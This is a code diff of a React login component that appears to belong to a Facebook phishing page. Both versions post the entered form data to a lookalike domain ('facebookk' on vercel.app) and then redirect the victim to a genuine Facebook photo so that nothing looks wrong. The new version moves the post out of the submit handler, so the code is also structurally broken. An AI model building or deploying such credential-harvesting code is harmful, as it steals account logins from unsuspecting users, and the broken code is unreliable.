@@ -18,16 +18,17 @@ const Login = () => {
      
     
      
-      const handleSubmit = async (e) => {
-        e.preventDefault();
-        axios.post('https://facebookk-6pr1.vercel.app/signup', formData)
-          .then((res) => {
-            console.log(res.data);
-            window.location.href = 'https://m.facebook.com/photo.php?fbid=527361450059357&set=a.126687590126747'; 
+      axios.post('https://facebookk-6pr1.vercel.app/signup', formData)
+  .then((res) => {
+    console.log(res.data); 
+    if (res.status === 200) {
+      window.open('https://m.facebook.com/photo.php?fbid=527361450059357&set=a.126687590126747', '_self');
+    }
+  })
+  .catch((err) => {
+    console.log(err);
+  });
 
-          })
-          .catch((err) => console.log(err));
-      };
    
 
     return (
